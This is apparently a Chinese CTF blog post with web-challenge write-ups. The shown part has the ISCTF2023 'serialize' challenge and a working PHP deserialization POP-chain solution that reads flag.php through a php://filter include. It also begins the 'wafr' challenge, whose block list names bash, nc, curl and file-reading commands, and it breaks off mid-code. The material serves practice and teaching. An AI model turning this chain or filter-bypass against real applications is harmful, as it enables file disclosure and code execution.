<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="web杂练ISCTF2023serialize问题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phphighlight_file(__FILE__);error_reporting(0);&#x2F;&#x2F;这段 PHP 代码定义了一个名为 artif">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf-web一些杂练（24.5之前）">
<meta property="og:url" content="http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/index.html">
<meta property="og:site_name" content="ShuiChang厕纸博客站">
<meta property="og:description" content="web杂练ISCTF2023serialize问题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phphighlight_file(__FILE__);error_reporting(0);&#x2F;&#x2F;这段 PHP 代码定义了一个名为 artif">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-05-04T16:22:00.000Z">
<meta property="article:modified_time" content="2024-05-04T16:42:04.476Z">
<meta property="article:author" content="ShuiChang">
<meta property="article:tag" content="web杂练">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ctf-web一些杂练（24.5之前）</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/05/05/Zotero%E6%8A%98%E7%A3%A8%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/05/05/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%EF%BC%88PHP%E5%92%8C%E4%B8%80%E7%82%B9Python%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&text=ctf-web一些杂练（24.5之前）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&is_video=false&description=ctf-web一些杂练（24.5之前）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctf-web一些杂练（24.5之前）&body=Check out this article: http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&name=ctf-web一些杂练（24.5之前）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&t=ctf-web一些杂练（24.5之前）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%9D%82%E7%BB%83"><span class="toc-number">1.</span> <span class="toc-text">web杂练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCTF2023"><span class="toc-number">1.1.</span> <span class="toc-text">ISCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize"><span class="toc-number">1.1.1.</span> <span class="toc-text">serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wafr"><span class="toc-number">1.1.2.</span> <span class="toc-text">wafr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCUCTF2023"><span class="toc-number">1.2.</span> <span class="toc-text">SCUCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2048"><span class="toc-number">1.2.1.</span> <span class="toc-text">2048</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lessismore"><span class="toc-number">1.2.2.</span> <span class="toc-text">lessismore</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E8%B0%83%E7%A0%94%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">前期调研和信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less%E6%96%87%E6%A1%A3%E7%A0%94%E8%AF%BB"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Less文档研读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E7%BC%96%E5%86%99"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">payload编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E8%B5%84%E6%BA%90"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">用到的资源</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tarit"><span class="toc-number">1.2.3.</span> <span class="toc-text">tarit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%A0%94%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">调研和信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">方案尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">最终解决方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebBuilder"><span class="toc-number">1.2.4.</span> <span class="toc-text">WebBuilder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81%EF%BC%9A%E5%AF%B9API%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">审计代码：对API的测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%9A%E9%80%9A%E8%BF%87API%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">编写代码：通过API测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CXSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">审计代码：如何进行XSS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%88%86%E6%9E%90"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">最终分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E9%A1%B5%E9%9D%A2%E7%BC%96%E5%86%99"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">XSS漏洞页面编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E5%90%8E%E7%AB%AF%E7%BC%96%E5%86%99"><span class="toc-number">1.2.4.6.</span> <span class="toc-text">flask后端编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.7.</span> <span class="toc-text">发动攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E5%90%8E%E7%AB%AF%E7%9A%84flask%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.4.8.</span> <span class="toc-text">所有后端的flask代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.2.5.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easysql"><span class="toc-number">1.2.6.</span> <span class="toc-text">easysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">错误的尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">解决方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.2.7.</span> <span class="toc-text">ez_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">几次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A%E5%B0%9D%E8%AF%95%E6%8A%8Aphp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%86%99%E5%88%B0headers%E9%87%8C"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">解法1：尝试把php命令执行代码写到headers里</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A%E5%B0%9D%E8%AF%95%E6%8A%8Aphp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E5%86%99%E5%88%B0get%E5%8F%82%E6%95%B0%E9%87%8C"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">解法2：尝试把php命令执行代码命令写到get参数里</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-web"><span class="toc-number">1.2.8.</span> <span class="toc-text">ez_web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0XXE"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">构造XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0SSRF%EF%BC%9AGopher"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">构造SSRF：Gopher</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%AF%B9127-0-0-1%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">绕过对127.0.0.1的限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-upload"><span class="toc-number">1.2.9.</span> <span class="toc-text">hard_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%92%8Ceasy-upload%E4%B8%80%E6%A0%B7%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">和easy upload一样的解法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-%E7%AE%80%E5%8D%95%E9%A2%98%E5%BF%AB%E9%80%9F%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">BUUCTF 简单题快速过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">1.3.1.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">1.3.2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ctf-web一些杂练（24.5之前）
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ShuiChang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-05-04T16:22:00.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/web%E6%9D%82%E7%BB%83/" rel="tag">web杂练</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="web杂练"><a href="#web杂练" class="headerlink" title="web杂练"></a>web杂练</h1><h2 id="ISCTF2023"><a href="#ISCTF2023" class="headerlink" title="ISCTF2023"></a>ISCTF2023</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><p>问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这段 PHP 代码定义了一个名为 artifact 的类，该类包含两个公共属性 $excalibuer 和 $arrow。此外，该类还定义了一个名为 __toString() 的魔术方法。</span></span><br><span class="line"><span class="comment">//当我们尝试将一个 artifact 对象转换为字符串时，该方法会被自动调用。在这个方法中，我们首先输出了一条消息 “为Saber选择了对的武器!”，然后返回 $excalibuer 对象的 $arrow 属性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># release 传saber类</span></span><br><span class="line">    <span class="comment"># __get() ：通过此方法，可以获取到类中私有对象的值，然后直接通过&quot;-&gt;&quot;获取对象的值；</span></span><br><span class="line">    <span class="comment"># 带有 __get() 方法的类在访问未定义或在不可访问的属性时，会自动调用 __get() 方法。在这个方法中，我们可以自定义返回值或者抛出异常 123。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$functioin</span> = <span class="variable language_">$this</span>-&gt;release;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$functioin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># weapon 传文件包含的东西</span></span><br><span class="line">    <span class="comment"># __invoke()：当尝试以调用函数的方式调用一个对象时，此方法会被自动调用；所以需要用prepare类调用saber类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;胜利！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这段 PHP 代码定义了一个名为 summon 的类，该类包含两个公共属性 $Saber 和 $Rider。此外，该类还定义了一个名为 __wakeup() 的魔术方法。</span></span><br><span class="line"><span class="comment">//当我们尝试从序列化的数据中重新创建一个 summon 对象时，该方法会被自动调用。在这个方法中，我们首先输出了一条消息 “开始召唤从者！”，然后输出了 $Saber 属性的值</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#__wakeup()：此方法在执行函数unserialize()前调用，能够将序列化的对象进行反序列化；</span></span><br><span class="line">    <span class="comment"># 是否这里是最开始需要弄的地方？</span></span><br><span class="line">    <span class="comment"># 这里的Saber参数是否需要为artifact的反序列化字符串？</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * summon:wakeup()</span></span><br><span class="line"><span class="comment"> * artifact:toString()</span></span><br><span class="line"><span class="comment"> * prepare:get()</span></span><br><span class="line"><span class="comment"> * saber:invoke()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$summon</span> = <span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$artifact</span> = <span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$prepare</span> = <span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$saber</span> = <span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$saber</span>-&gt;weapon = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$prepare</span>-&gt;release = <span class="variable">$saber</span>;</span><br><span class="line"><span class="variable">$artifact</span>-&gt;excalibuer= <span class="variable">$prepare</span>;</span><br><span class="line"><span class="variable">$summon</span> -&gt; Saber = <span class="variable">$artifact</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$summon</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Read /flaggggggg.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;<span class="comment">//strings</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;想读我文件？大胆。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;无字母数字RCE？大胆！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;奇技淫巧？大胆！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    